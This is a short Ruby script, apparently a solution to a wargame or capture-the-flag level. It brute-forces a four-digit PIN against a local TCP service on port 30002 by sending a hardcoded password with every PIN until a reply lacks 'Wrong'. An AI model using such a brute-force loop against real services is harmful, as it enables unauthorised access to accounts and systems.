require 'socket'

host = 'localhost'
port = 30002

password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
iterations = 9999

socket = TCPSocket.new(host, port)
socket.recv(2048) #Discard socket welcome message

(0..iterations).each do |i|
  pin = sprintf("%04d", i.to_s)
  passwordstring = "#{password} #{pin}\n"
  puts passwordstring

  socket.send passwordstring, 0
  result = socket.recv(2048)
  next if result.include? "Wrong"
  puts result
  exit
end

socket.close